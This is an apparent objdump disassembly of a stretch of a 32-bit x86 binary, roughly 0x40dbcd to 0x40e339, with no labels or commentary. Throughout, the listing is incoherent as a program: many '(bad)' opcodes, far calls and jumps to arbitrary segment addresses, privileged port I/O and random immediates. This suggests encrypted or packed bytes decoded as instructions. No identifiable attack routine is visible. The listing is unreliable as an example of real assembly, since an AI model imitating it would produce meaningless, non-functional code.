  40dbcd:	inc    edx
  40dbce:	rol    cl,cl
  40dbd0:	jmp    0xda0cc5d8
  40dbd5:	mov    ecx,0x5c14756f
  40dbda:	push   esp
  40dbdb:	aam    0xbf
  40dbdd:	mov    WORD PTR [esp+ecx*8+0x60],cs
  40dbe1:	cmc    
  40dbe2:	xchg   esp,eax
  40dbe3:	ins    BYTE PTR es:[edi],dx
  40dbe4:	rol    DWORD PTR [esi],0x31
  40dbe7:	adc    dl,BYTE PTR [eax-0x347e6a15]
  40dbed:	sub    ebp,DWORD PTR [ecx-0x68]
  40dbf0:	test   BYTE PTR [edi],al
  40dbf2:	shl    BYTE PTR [esi+0x25],cl
  40dbf5:	fisub  DWORD PTR [ebp+eiz*4+0x47]
  40dbf9:	jnp    0x40dc67
  40dbfb:	(bad)  
  40dbfc:	xor    BYTE PTR [eax-0x47d42a6c],al
  40dc02:	or     eax,0xaddaef69
  40dc07:	imul   edi,DWORD PTR [edx+0x1f],0xf50b73d9
  40dc0e:	in     eax,0xcb
  40dc10:	(bad)  
  40dc12:	mov    al,0x7c
  40dc14:	cli    
  40dc15:	lds    ecx,FWORD PTR [ecx-0x748ac8f6]
  40dc1b:	cmp    ah,ah
  40dc1d:	push   cs
  40dc1e:	leave  
  40dc1f:	cld    
  40dc20:	das    
  40dc21:	jb     0x40dba8
  40dc23:	leave  
  40dc24:	pop    eax
  40dc25:	pop    esp
  40dc26:	push   eax
  40dc27:	(bad)  
  40dc28:	xchg   ecx,eax
  40dc29:	jecxz  0x40dbbd
  40dc2b:	jnp    0x40dc16
  40dc2d:	inc    eax
  40dc2e:	mov    ebx,DWORD PTR [esi-0x4c6b6ea6]
  40dc34:	rcr    BYTE PTR [ebp-0x6a],0xf3
  40dc38:	xor    edx,esp
  40dc3a:	(bad)  
  40dc3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc3c:	icebp  
  40dc3d:	and    bh,0xfa
  40dc40:	mov    eax,0x40b9e3b4
  40dc45:	lods   al,BYTE PTR ds:[esi]
  40dc46:	into   
  40dc47:	nop
  40dc48:	fadd   DWORD PTR [ecx-0x53]
  40dc4b:	stos   BYTE PTR es:[edi],al
  40dc4c:	sub    DWORD PTR [esp],ebx
  40dc4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc50:	sbb    edi,edx
  40dc52:	(bad)  
  40dc53:	(bad)  [ebx+0x7d04eaed]
  40dc59:	pop    ss
  40dc5a:	jecxz  0x40dc77
  40dc5c:	int3   
  40dc5d:	sbb    BYTE PTR [ebx],dh
  40dc5f:	sub    al,0x4a
  40dc61:	cmc    
  40dc62:	mov    WORD PTR [eax-0x6c742e8e],ds
  40dc68:	mov    edx,0x69b00710
  40dc6d:	cdq    
  40dc6e:	inc    ecx
  40dc6f:	and    esi,eax
  40dc71:	push   ss
  40dc72:	pop    ebx
  40dc73:	or     DWORD PTR [eax],edi
  40dc75:	xor    ch,bl
  40dc77:	add    BYTE PTR [eax+0x1f],cl
  40dc7a:	call   0xc9ab:0x5ac2b120
  40dc81:	enter  0x7307,0xd4
  40dc85:	xchg   esi,eax
  40dc86:	fucomp st(1)
  40dc88:	pop    ebx
  40dc89:	xchg   ebx,eax
  40dc8a:	out    0x99,al
  40dc8c:	daa    
  40dc8d:	sub    esp,eax
  40dc8f:	fmul   DWORD PTR [edx+0x640f500f]
  40dc95:	pop    ebx
  40dc96:	fstp   TBYTE PTR [edi]
  40dc98:	nop
  40dc99:	in     al,dx
  40dc9a:	(bad)  
  40dc9b:	int3   
  40dc9c:	or     DWORD PTR [eax+0x30],edx
  40dc9f:	pusha  
  40dca0:	loop   0x40dc3e
  40dca2:	mov    dh,0x84
  40dca4:	sbb    al,0xeb
  40dca6:	jmp    DWORD PTR [ecx]
  40dca8:	sub    BYTE PTR [ebx],bl
  40dcaa:	jl     0x40dcc8
  40dcac:	mov    al,BYTE PTR [edx]
  40dcae:	sbb    bl,dh
  40dcb0:	imul   BYTE PTR [ebp+0x6198605a]
  40dcb6:	test   al,0x1
  40dcb8:	das    
  40dcb9:	mov    esi,0xb232876d
  40dcbe:	push   ebx
  40dcbf:	mov    cl,0x32
  40dcc1:	jmp    0xf8cc:0x6da939a3
  40dcc8:	lds    eax,FWORD PTR [esi]
  40dcca:	push   ds
  40dccb:	pop    edi
  40dccc:	push   ss
  40dccd:	sbb    esp,DWORD PTR [edi+0x5a]
  40dcd0:	jae    0x40dc60
  40dcd2:	fsubp  st(1),st
  40dcd4:	repnz or bl,BYTE PTR [edx]
  40dcd7:	loop   0x40dccc
  40dcd9:	popa   
  40dcda:	jno    0x40dc7a
  40dcdc:	mov    dh,0xf0
  40dcde:	jmp    0xcd79c23c
  40dce3:	mov    ebx,0x96879ea2
  40dce8:	out    dx,al
  40dce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcea:	and    al,0x10
  40dcec:	ficomp WORD PTR [ecx-0x8]
  40dcef:	xor    eax,0x6e5fc183
  40dcf4:	push   esp
  40dcf5:	icebp  
  40dcf6:	or     BYTE PTR [edx],dl
  40dcf8:	mov    al,ds:0x2361c4eb
  40dcfd:	push   ebp
  40dcfe:	aad    0xa8
  40dd00:	pusha  
  40dd01:	(bad)  
  40dd02:	imul   eax,DWORD PTR [esi],0x901967c1
  40dd08:	imul   ebp,edi,0x55
  40dd0b:	cs mov ebp,0x900a0160
  40dd11:	arpl   ax,cx
  40dd13:	in     eax,0xcf
  40dd15:	gs add eax,0xa71462a1
  40dd1b:	or     al,0x21
  40dd1d:	(bad)  
  40dd1e:	sbb    BYTE PTR [edi-0x7c],al
  40dd21:	pushf  
  40dd22:	jns    0x40dd81
  40dd24:	adc    DWORD PTR [ebx+0x3727ccf0],edx
  40dd2a:	sub    al,BYTE PTR [edx+0x38]
  40dd2d:	das    
  40dd2e:	push   0xfffffffc
  40dd30:	aad    0x20
  40dd32:	lea    eax,[esi]
  40dd34:	pop    esp
  40dd35:	or     bl,BYTE PTR [esi]
  40dd37:	mov    dl,0xd3
  40dd39:	and    ah,ch
  40dd3b:	adc    cl,bh
  40dd3d:	mov    WORD PTR [ebp+0x7b],ss
  40dd40:	lds    eax,FWORD PTR [edi-0x368f7ee4]
  40dd46:	jns    0x40dd78
  40dd48:	add    BYTE PTR [ecx+esi*1+0x47],bl
  40dd4c:	in     al,dx
  40dd4d:	and    DWORD PTR [esi+0x23],ebp
  40dd50:	inc    ebp
  40dd51:	push   ss
  40dd52:	sub    al,0x5
  40dd54:	in     al,dx
  40dd55:	xor    DWORD PTR [ebx],ebx
  40dd57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd58:	cmp    al,BYTE PTR [edx-0x1f]
  40dd5b:	pop    ds
  40dd5c:	cdq    
  40dd5d:	xchg   esi,eax
  40dd5e:	packssdw mm6,QWORD PTR [edx+0x34416a6f]
  40dd65:	retf   
  40dd66:	loopne 0x40ddc2
  40dd68:	dec    edi
  40dd69:	push   ds
  40dd6a:	adc    bl,bl
  40dd6c:	repz in eax,dx
  40dd6e:	pop    es
  40dd6f:	adc    al,BYTE PTR [esi]
  40dd71:	dec    esi
  40dd72:	sahf   
  40dd73:	ins    BYTE PTR es:[edi],dx
  40dd74:	call   0x4114:0x71df9554
  40dd7b:	je     0x40ddde
  40dd7d:	sub    DWORD PTR [ebp-0x5a53c172],0x16
  40dd84:	pop    esi
  40dd85:	sub    eax,0x51190e45
  40dd8a:	jmp    0x13d9:0xfebfbc62
  40dd91:	jle    0x40dd8c
  40dd93:	mov    BYTE PTR [eax*8-0x78400386],al
  40dd9a:	pop    ebp
  40dd9b:	(bad)  
  40dd9d:	mov    al,ds:0x4108d17a
  40dda2:	ret    
  40dda3:	out    0xde,al
  40dda5:	daa    
  40dda6:	pushf  
  40dda7:	add    esi,DWORD PTR [ecx]
  40dda9:	fnstsw WORD PTR ds:[edi-0xb3e77ad]
  40ddb0:	push   ds
  40ddb1:	and    dh,BYTE PTR [ebx]
  40ddb3:	mov    ebx,0x71266e2a
  40ddb8:	xor    ah,BYTE PTR [eax]
  40ddba:	adc    bl,BYTE PTR [edx-0x3d]
  40ddbd:	push   eax
  40ddbe:	inc    DWORD PTR [ecx+esi*1]
  40ddc1:	push   edi
  40ddc2:	fcmovbe st,st(6)
  40ddc4:	scas   al,BYTE PTR es:[edi]
  40ddc5:	mov    gs,WORD PTR [eax-0x5320eb32]
  40ddcb:	cs (bad) 
  40ddce:	push   cs
  40ddcf:	ja     0x40de17
  40ddd1:	cmp    BYTE PTR [edx-0x39],cl
  40ddd4:	xchg   esi,eax
  40ddd5:	jp     0x40ddc0
  40ddd7:	xchg   BYTE PTR [esi-0x21e3f59a],bl
  40dddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddde:	loope  0x40dda9
  40dde0:	push   eax
  40dde1:	shl    DWORD PTR [esi+0x30],cl
  40dde4:	and    eax,0xd8edf480
  40dde9:	xor    ax,0xe968
  40dded:	shr    DWORD PTR es:0x6a168921,1
  40ddf4:	xlat   BYTE PTR ds:[ebx]
  40ddf5:	test   cl,bl
  40ddf7:	xor    al,0x7c
  40ddf9:	hlt    
  40ddfa:	jb     0x40dd8e
  40ddfc:	sub    esp,esp
  40ddfe:	das    
  40ddff:	jg     0x40dd9f
  40de01:	jl     0xdb5c63f
  40de07:	cmp    eax,0x5262881e
  40de0c:	cwde   
  40de0d:	pop    edi
  40de0e:	fcom   DWORD PTR [edx+0x26250b9a]
  40de14:	mov    esi,0x9f63fb64
  40de19:	cmp    bl,BYTE PTR [ebx]
  40de1b:	in     al,0x67
  40de1d:	adc    ecx,DWORD PTR [edx+0x26304299]
  40de23:	div    eax
  40de25:	mov    cl,0xd3
  40de27:	aaa    
  40de28:	fldcw  WORD PTR [eax-0xe]
  40de2b:	daa    
  40de2c:	mov    ecx,DWORD PTR [edx+0xf]
  40de2f:	lds    edi,FWORD PTR [ecx+0x7352a4b2]
  40de35:	int3   
  40de36:	sub    edi,DWORD PTR [edx-0x26]
  40de39:	jb     0x40de71
  40de3b:	into   
  40de3c:	xor    BYTE PTR [edi+0x57],cl
  40de3f:	xlat   BYTE PTR ds:[ebx]
  40de40:	cmc    
  40de41:	jno    0x40de25
  40de43:	adc    eax,0x57b6656e
  40de48:	or     BYTE PTR [esi],dh
  40de4a:	inc    ecx
  40de4b:	bound  esi,QWORD PTR ds:0x4f517f8d
  40de51:	cdq    
  40de52:	or     DWORD PTR [ebx+0x389e8123],ebp
  40de58:	mov    WORD PTR [ebx],?
  40de5a:	dec    BYTE PTR [edi]
  40de5c:	sub    al,BYTE PTR [esi+0x52b09a82]
  40de62:	mov    ebx,0x6dd796d
  40de67:	retf   
  40de68:	aas    
  40de69:	sbb    eax,0x5ad886ca
  40de6e:	cdq    
  40de6f:	pop    ss
  40de70:	and    al,0xec
  40de72:	mov    bh,BYTE PTR [edx]
  40de74:	jne    0x40de14
  40de76:	jg     0x40def3
  40de78:	or     edx,DWORD PTR ds:0xd6a46a00
  40de7e:	jae    0x40de86
  40de80:	pop    edx
  40de81:	sub    al,0x74
  40de83:	sub    cl,dl
  40de85:	pop    esi
  40de86:	cmc    
  40de87:	push   esi
  40de88:	xchg   esp,eax
  40de89:	clc    
  40de8a:	xor    eax,0x5470ebc6
  40de8f:	inc    ecx
  40de90:	mov    al,0xea
  40de92:	das    
  40de93:	test   ch,ah
  40de95:	ret    0xdac2
  40de98:	jbe    0x40dedf
  40de9a:	mov    al,0xd8
  40de9c:	mov    bh,0xf8
  40de9e:	adc    eax,0x721be2ad
  40dea3:	mov    gs,esi
  40dea5:	and    eax,0xc379fc35
  40deaa:	(bad)  
  40deab:	sub    ebx,ecx
  40dead:	(bad)  
  40deae:	std    
  40deaf:	inc    esi
  40deb0:	not    DWORD PTR [esi-0x23]
  40deb3:	ds push ds
  40deb5:	pushf  
  40deb6:	inc    edx
  40deb7:	xlat   BYTE PTR es:[ebx]
  40deb9:	mov    ebx,0xc6ceac1d
  40debe:	cdq    
  40debf:	or     ch,BYTE PTR [edi+0x3f]
  40dec2:	in     al,dx
  40dec3:	push   edi
  40dec4:	push   edx
  40dec5:	push   esi
  40dec6:	sub    edx,DWORD PTR [ecx]
  40dec8:	dec    ebx
  40dec9:	mov    eax,ds:0xb482839b
  40dece:	mov    edi,0x841c2cfe
  40ded3:	push   ecx
  40ded4:	(bad)  
  40ded6:	pop    ecx
  40ded7:	bound  ecx,QWORD PTR [ebp+0x48]
  40deda:	cmp    BYTE PTR [edi-0x2cbea584],dh
  40dee0:	dec    ecx
  40dee1:	sbb    bh,ch
  40dee3:	jecxz  0x40de99
  40dee5:	mov    esp,0xce9e3a87
  40deea:	sbb    bl,BYTE PTR [ebx+ebx*8+0x7ae61c9b]
  40def1:	fwait
  40def2:	mov    ds:0xbf331210,al
  40def7:	std    
  40def8:	sub    eax,0x75cf832f
  40defd:	ja     0x40df24
  40deff:	lea    ebx,[esi+0x57cbfb9]
  40df05:	outs   dx,DWORD PTR ds:[esi]
  40df06:	aas    
  40df07:	adc    eax,0xd6163f0b
  40df0c:	sub    BYTE PTR [edi-0x33e02a75],dl
  40df12:	in     al,0x99
  40df14:	sti    
  40df15:	jmp    0x7c1b:0x41193fcc
  40df1c:	pop    es
  40df1d:	push   esi
  40df1e:	xchg   ecx,eax
  40df1f:	push   0xffffffa3
  40df21:	sub    DWORD PTR [esi+0x67],0x1
  40df25:	jmp    0x40df47
  40df27:	push   ds
  40df28:	fwait
  40df29:	push   ds
  40df2a:	cmp    esi,DWORD PTR [esi-0x5c0ae2b4]
  40df30:	stos   BYTE PTR es:[edi],al
  40df31:	cmp    eax,0xd447e372
  40df36:	jge    0x40dfa2
  40df38:	mov    bl,0x5
  40df3a:	mov    dh,0x4f
  40df3c:	ficomp WORD PTR [ecx]
  40df3e:	ret    0xacac
  40df41:	cmp    BYTE PTR [eax-0x7f],0x8a
  40df45:	stc    
  40df46:	sub    edi,edi
  40df48:	mov    BYTE PTR [eax+0x57],bl
  40df4b:	retf   
  40df4c:	push   esp
  40df4d:	or     DWORD PTR [esi+0x6558990f],edi
  40df53:	xchg   esp,eax
  40df54:	dec    esp
  40df55:	lds    ecx,FWORD PTR [eax-0x42d0ac2]
  40df5b:	or     DWORD PTR [esi-0x7e0b9654],0xffffff85
  40df62:	pop    ebp
  40df63:	(bad)  
  40df64:	pusha  
  40df65:	fisttp WORD PTR [eax+ebp*8+0x2d]
  40df69:	jbe    0x40dfb8
  40df6b:	pop    ss
  40df6c:	sub    al,BYTE PTR [edi+0x26]
  40df6f:	fwait
  40df70:	add    al,0x7b
  40df72:	(bad)  
  40df73:	fabs   
  40df75:	push   esi
  40df76:	pop    es
  40df77:	mov    bl,0x22
  40df79:	arpl   cx,sp
  40df7b:	inc    esi
  40df7c:	test   DWORD PTR [edx],0xf6f381e6
  40df82:	pop    ebx
  40df83:	stos   DWORD PTR es:[edi],eax
  40df84:	sbb    bh,al
  40df86:	nop
  40df87:	in     al,dx
  40df88:	mov    ah,BYTE PTR [edi]
  40df8a:	push   es
  40df8b:	mov    ch,0x60
  40df8d:	dec    ecx
  40df8e:	adc    al,0xe9
  40df90:	xchg   DWORD PTR [eax],ecx
  40df92:	ds scas al,BYTE PTR es:[edi]
  40df94:	(bad)  
  40df95:	into   
  40df96:	or     BYTE PTR [ecx-0x47],bl
  40df99:	call   0x8008:0xffc24baa
  40dfa0:	aad    0x9d
  40dfa2:	ins    BYTE PTR es:[edi],dx
  40dfa3:	sub    DWORD PTR [eax-0x59],edi
  40dfa6:	jns    0x40df6a
  40dfa8:	hlt    
  40dfa9:	outs   dx,BYTE PTR ds:[esi]
  40dfaa:	or     al,0x2b
  40dfac:	inc    ebp
  40dfad:	jl     0x40dfed
  40dfaf:	lahf   
  40dfb0:	mov    edx,0x3c5fad85
  40dfb5:	jg     0x40df77
  40dfb7:	xchg   ebp,eax
  40dfb8:	es xor esi,esi
  40dfbb:	mov    ecx,ebx
  40dfbd:	loop   0x40e02f
  40dfbf:	out    0xad,al
  40dfc1:	adc    bh,dh
  40dfc3:	das    
  40dfc4:	or     ah,0xd6
  40dfc7:	pop    es
  40dfc8:	xor    al,BYTE PTR [ecx*2+0x3ad3235c]
  40dfcf:	xlat   BYTE PTR ds:[ebx]
  40dfd0:	std    
  40dfd1:	jbe    0x40df79
  40dfd3:	sbb    BYTE PTR [edx],al
  40dfd5:	xor    dl,BYTE PTR [eax-0x31]
  40dfd8:	aad    0xd7
  40dfda:	into   
  40dfdb:	xchg   ebx,eax
  40dfdc:	(bad)  
  40dfdd:	mov    esi,0x1f619b83
  40dfe2:	cmp    eax,0x41f8247a
  40dfe7:	out    0x35,al
  40dfe9:	xor    al,0xc4
  40dfeb:	lea    edi,[ebp+0x67]
  40dfee:	fcmovb st,st(2)
  40dff0:	sbb    ch,BYTE PTR [ecx-0x51]
  40dff3:	bound  ebx,QWORD PTR [ebx+ecx*2]
  40dff6:	mov    eax,0x1fb551d6
  40dffb:	and    al,0x8a
  40dffd:	cmp    DWORD PTR [edx+0x38cef110],edx
  40e003:	stc    
  40e004:	or     ebx,DWORD PTR [ebx+0x34]
  40e007:	cs nop
  40e009:	jecxz  0x40dfcf
  40e00b:	out    dx,eax
  40e00c:	shl    BYTE PTR [ebp+0x324d6f33],1
  40e012:	add    bl,bl
  40e014:	sbb    ebp,ecx
  40e016:	sar    BYTE PTR [ebp-0x55da7785],cl
  40e01c:	rcl    DWORD PTR [ecx],0xd
  40e01f:	add    BYTE PTR [ecx-0x7f],cl
  40e022:	scas   eax,DWORD PTR es:[edi]
  40e023:	mov    dh,0xf2
  40e025:	ja     0x40e09a
  40e027:	out    dx,eax
  40e028:	jb     0x40e029
  40e02a:	ins    DWORD PTR es:[edi],dx
  40e02b:	jnp    0x40e030
  40e02d:	pop    esp
  40e02e:	jnp    0x40dfcc
  40e030:	or     DWORD PTR [ebx-0x536a1ec1],ebx
  40e036:	jle    0x40e01c
  40e038:	xchg   edi,eax
  40e039:	mov    eax,0x2c0caf9c
  40e03e:	xchg   ebp,eax
  40e03f:	mov    ah,0xef
  40e041:	push   0x706fe4c0
  40e046:	scas   eax,DWORD PTR es:[edi]
  40e047:	loope  0x40e025
  40e049:	sub    BYTE PTR [ebx+0x64],cl
  40e04c:	and    DWORD PTR [ecx+0x27],eax
  40e04f:	jns    0x40e089
  40e051:	mov    ds:0xc60eb8a5,eax
  40e056:	pop    edi
  40e057:	sbb    DWORD PTR ss:[edx-0x4ef1b397],eax
  40e05e:	cmp    al,0x8a
  40e060:	shl    BYTE PTR [eax+0x61ed0e88],0x83
  40e067:	mov    edi,0xca567f64
  40e06c:	and    al,0xeb
  40e06e:	sti    
  40e06f:	and    edi,DWORD PTR [esi-0x75b52c00]
  40e075:	js     0x40e0ef
  40e077:	mov    eax,ds:0xa13a38bf
  40e07c:	lods   eax,DWORD PTR ds:[esi]
  40e07d:	shl    BYTE PTR [eax+0x4c6f6f9c],cl
  40e083:	cmp    eax,0x78ee00b
  40e088:	call   0x959e:0x44599ce8
  40e08f:	sbb    al,BYTE PTR [esi+ebp*8]
  40e092:	fwait
  40e093:	pop    esi
  40e094:	cmp    al,0xc4
  40e096:	in     al,0xe7
  40e098:	lds    edi,FWORD PTR [esi-0x61df0d4]
  40e09e:	push   ss
  40e09f:	mov    eax,0x9a976cf9
  40e0a4:	sub    DWORD PTR [esi-0x74],ecx
  40e0a7:	in     eax,0x96
  40e0a9:	push   edx
  40e0aa:	sub    edx,DWORD PTR [esi+0x41]
  40e0ad:	inc    ecx
  40e0ae:	push   ds
  40e0af:	stos   DWORD PTR es:[edi],eax
  40e0b0:	xor    eax,0x28977c51
  40e0b5:	int    0x18
  40e0b7:	imul   ebx,DWORD PTR [ebx-0x2720fc62],0x9
  40e0be:	iret   
  40e0bf:	mov    ebx,0x5c404af0
  40e0c4:	jno    0x40e058
  40e0c6:	cld    
  40e0c7:	pop    esp
  40e0c8:	jp     0x40e092
  40e0ca:	mov    ecx,0x599a53da
  40e0cf:	mov    al,al
  40e0d1:	push   esp
  40e0d2:	leave  
  40e0d3:	inc    esi
  40e0d4:	mov    ebx,0xf300d2bf
  40e0d9:	sbb    eax,0x540cfc63
  40e0de:	scas   eax,DWORD PTR es:[edi]
  40e0df:	fisubr DWORD PTR [ebp-0x63]
  40e0e2:	push   0x55
  40e0e4:	cmp    al,0xa2
  40e0e6:	in     al,dx
  40e0e7:	idiv   DWORD PTR [ebp+0x58d9d638]
  40e0ed:	stc    
  40e0ee:	lock dec ebx
  40e0f0:	test   BYTE PTR [edx],ah
  40e0f2:	dec    edi
  40e0f3:	or     eax,0xabd60437
  40e0f8:	cli    
  40e0f9:	inc    esp
  40e0fa:	dec    edi
  40e0fb:	or     al,0x9f
  40e0fd:	inc    eax
  40e0fe:	in     eax,0x25
  40e100:	adc    esp,DWORD PTR [ebp-0x64]
  40e103:	mov    dh,0x6a
  40e105:	dec    ecx
  40e106:	bnd jge 0x40e0ab
  40e109:	push   cs
  40e10a:	cmp    eax,0x589a6bbc
  40e10f:	dec    esi
  40e110:	mov    al,ds:0xf5ffabca
  40e115:	mov    dh,0x8a
  40e117:	inc    eax
  40e118:	arpl   WORD PTR [eax],dx
  40e11a:	iret   
  40e11b:	adc    BYTE PTR [edx],ch
  40e11d:	xchg   DWORD PTR [ebp+0x4b8449ed],edi
  40e123:	inc    ebp
  40e124:	lahf   
  40e125:	sub    BYTE PTR [edi-0x51],ah
  40e128:	or     edi,DWORD PTR ss:[ecx]
  40e12b:	push   0xdfb52eb0
  40e130:	lods   al,BYTE PTR ds:[esi]
  40e131:	retf   
  40e132:	js     0x40e106
  40e134:	mov    esi,0xd38b69bc
  40e139:	ret    0xe850
  40e13c:	ror    BYTE PTR [ecx-0x7c],0xa6
  40e140:	mov    ebp,DWORD PTR [esi]
  40e142:	or     eax,0xfa9fb475
  40e147:	loope  0x40e109
  40e149:	je     0x40e1b5
  40e14b:	sub    BYTE PTR [edx+0x8],bh
  40e14e:	je     0x40e0e5
  40e150:	or     al,0xbc
  40e152:	mov    bl,0xa8
  40e154:	jmp    FWORD PTR [esi+0x60]
  40e157:	into   
  40e158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e159:	shl    DWORD PTR [ebp+0x16],0x28
  40e15d:	dec    edx
  40e15e:	sahf   
  40e15f:	sub    DWORD PTR [edx+0x20],esi
  40e162:	repz mov dh,0x6a
  40e165:	xchg   BYTE PTR [edx-0x50],bh
  40e168:	dec    edi
  40e169:	mov    bh,0x4f
  40e16b:	outs   dx,BYTE PTR ds:[esi]
  40e16c:	sar    DWORD PTR [ecx+0x525e21c7],0x92
  40e173:	cld    
  40e174:	jne    0x40e1bd
  40e176:	retf   
  40e177:	xchg   edi,eax
  40e178:	aaa    
  40e179:	leave  
  40e17a:	lods   eax,DWORD PTR ds:[esi]
  40e17b:	addr16 loope 0x40e15a
  40e17e:	int    0x44
  40e180:	sbb    BYTE PTR [ecx+ebx*2],bl
  40e183:	scas   eax,DWORD PTR es:[edi]
  40e184:	fst    st(0)
  40e186:	js     0x40e133
  40e188:	(bad)  
  40e189:	xor    esp,0x3f
  40e18c:	imul   esi,ecx,0xffffffeb
  40e18f:	add    dh,0x8d
  40e192:	cwde   
  40e193:	adc    dh,dh
  40e195:	ins    DWORD PTR es:[edi],dx
  40e196:	pop    ebp
  40e197:	in     al,0xb0
  40e199:	lock cmp edx,DWORD PTR [ecx+edx*4]
  40e19d:	sbb    al,0x53
  40e19f:	fsub   QWORD PTR [ecx-0x78]
  40e1a2:	mov    edi,0x60d580c7
  40e1a7:	(bad)  
  40e1a9:	sbb    ah,BYTE PTR [ecx+edi*4-0x592401e9]
  40e1b0:	push   ds
  40e1b1:	mov    esp,0x55b41bcf
  40e1b6:	push   ebp
  40e1b7:	addr16 ja 0x40e190
  40e1ba:	retf   0xdb4a
  40e1bd:	cmp    bl,BYTE PTR [esi-0x75]
  40e1c0:	loopne 0x40e1ba
  40e1c2:	mov    edx,0x948d9161
  40e1c7:	call   0xc6b0d8d7
  40e1cc:	les    edi,FWORD PTR [eax+0x58690001]
  40e1d2:	in     eax,0x23
  40e1d4:	adc    al,BYTE PTR [bp+si]
  40e1d7:	push   eax
  40e1d8:	mov    edi,0x2b7aa0bc
  40e1dd:	retf   0xf680
  40e1e0:	inc    ecx
  40e1e1:	dec    edi
  40e1e2:	mov    eax,DWORD PTR [ebp-0xe]
  40e1e5:	xchg   esp,eax
  40e1e6:	mov    cl,0x96
  40e1e8:	lods   eax,DWORD PTR ds:[esi]
  40e1e9:	outs   dx,DWORD PTR ds:[esi]
  40e1ea:	mov    ebp,0x4d29a9f3
  40e1ef:	inc    ecx
  40e1f0:	sahf   
  40e1f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1f2:	mov    ds:0x430bf08a,al
  40e1f7:	inc    esi
  40e1f8:	repz dec edx
  40e1fa:	jae    0x40e22e
  40e1fc:	push   esi
  40e1fd:	xor    eax,0x97d7c110
  40e202:	mov    es,WORD PTR [ebx-0x66]
  40e205:	push   cs
  40e206:	mov    ebp,0x7e5f7824
  40e20b:	lods   al,BYTE PTR ds:[esi]
  40e20c:	xor    eax,0x64348a15
  40e211:	nop/reserved BYTE PTR [edi]
  40e214:	lods   al,BYTE PTR ds:[esi]
  40e215:	(bad)  
  40e217:	sub    DWORD PTR [esi+0x39],0xffffffe8
  40e21b:	jae    0x40e209
  40e21d:	or     BYTE PTR [esi+ecx*1],dl
  40e220:	sub    eax,0xc0f723ca
  40e225:	mov    cl,0x2f
  40e227:	sahf   
  40e228:	adc    eax,0x8413d8c0
  40e22d:	in     eax,0x21
  40e22f:	push   ss
  40e230:	in     eax,0xb4
  40e232:	dec    eax
  40e233:	cmp    BYTE PTR [ecx+0x48],dl
  40e236:	fucomi st,st(0)
  40e238:	aad    0x16
  40e23a:	cld    
  40e23b:	(bad)  
  40e23c:	cld    
  40e23d:	pop    esp
  40e23e:	push   0x14
  40e240:	mov    ?,WORD PTR [edx-0x23]
  40e243:	cmp    dh,BYTE PTR [eax]
  40e245:	pop    esp
  40e246:	mov    ebp,0xc1f31977
  40e24b:	or     BYTE PTR [ecx+0x23fe5347],0x77
  40e252:	adc    edx,DWORD PTR [edx-0x7d7824f7]
  40e258:	push   edx
  40e259:	gs jnp 0x40e224
  40e25c:	(bad)  
  40e25d:	xor    ecx,DWORD PTR [ecx+0x5]
  40e260:	mov    ebp,0x6aa4b2e
  40e265:	or     edi,DWORD PTR [esi+0x6d]
  40e268:	push   ds
  40e269:	imul   edi,DWORD PTR ds:0xa6bcffa1,0x27
  40e270:	aad    0xc3
  40e272:	arpl   WORD PTR [eax],ax
  40e274:	inc    ecx
  40e275:	sbb    BYTE PTR [edx],dh
  40e277:	shl    BYTE PTR [esi-0x31],cl
  40e27a:	or     al,0x66
  40e27c:	sub    bl,bl
  40e27e:	es mov eax,0xd657d3f2
  40e284:	sbb    ch,BYTE PTR [edx]
  40e286:	int    0xf9
  40e288:	sbb    al,0xa2
  40e28a:	push   ecx
  40e28b:	adc    eax,DWORD PTR [eax-0x2d]
  40e28e:	cli    
  40e28f:	repnz add eax,DWORD PTR [edi]
  40e292:	or     cl,dl
  40e294:	dec    ebp
  40e295:	mov    eax,ds:0x37dc6729
  40e29a:	xchg   ebx,eax
  40e29b:	push   esi
  40e29c:	in     eax,0xb3
  40e29e:	out    dx,al
  40e29f:	stc    
  40e2a0:	arpl   WORD PTR [eax],si
  40e2a2:	scas   eax,DWORD PTR es:[edi]
  40e2a3:	mov    al,ds:0x77226a40
  40e2a8:	xor    eax,0x9762531e
  40e2ad:	(bad)  
  40e2ae:	clc    
  40e2af:	fcom   QWORD PTR [ecx-0x51]
  40e2b2:	xchg   edx,eax
  40e2b3:	and    edi,DWORD PTR [ebx-0x6c20e934]
  40e2b9:	mov    edi,0xe162f10e
  40e2be:	pop    edi
  40e2bf:	jb     0x40e32d
  40e2c1:	test   dl,al
  40e2c3:	jns    0x40e245
  40e2c5:	call   0x3b85:0x7fd2a0d7
  40e2cc:	je     0x40e344
  40e2ce:	int    0xea
  40e2d0:	das    
  40e2d1:	daa    
  40e2d2:	call   0xa2aa:0xd43557e6
  40e2d9:	test   al,0xfa
  40e2db:	fldcw  WORD PTR [ecx-0x3]
  40e2de:	aas    
  40e2df:	jne    0x40e2d7
  40e2e1:	hlt    
  40e2e2:	cmp    dh,al
  40e2e4:	adc    al,0xba
  40e2e6:	mov    cl,0x46
  40e2e8:	fs into 
  40e2ea:	inc    BYTE PTR [ebx+ebx*8+0x47]
  40e2ee:	mov    edx,0x3da00639
  40e2f3:	mov    esi,0xc861975f
  40e2f8:	call   FWORD PTR [ecx+ebx*1-0x22]
  40e2fc:	xchg   ebx,eax
  40e2fd:	mov    DWORD PTR [ecx+eax*4+0x6da3d5b1],esi
  40e304:	xor    DWORD PTR [ebx+0x5e4ecdc0],eax
  40e30a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e30b:	or     eax,DWORD PTR [esi+0x6b]
  40e30e:	mov    ebp,0x2aac9411
  40e313:	xchg   ecx,eax
  40e314:	adc    al,0x71
  40e316:	loopne 0x40e371
  40e318:	outs   dx,BYTE PTR ds:[esi]
  40e319:	push   cs
  40e31a:	add    al,0xf0
  40e31c:	mov    esp,0x48114338
  40e321:	mov    fs,WORD PTR [eax]
  40e323:	ins    BYTE PTR es:[edi],dx
  40e324:	fld    TBYTE PTR ss:[eax*2+0x60298e81]
  40e32c:	aas    
  40e32d:	fbld   TBYTE PTR [eax-0x62]
  40e330:	sub    eax,0xe266401
  40e335:	jbe    0x40e355
  40e337:	mov    bh,0x78
  40e339:	loop   0x40e307
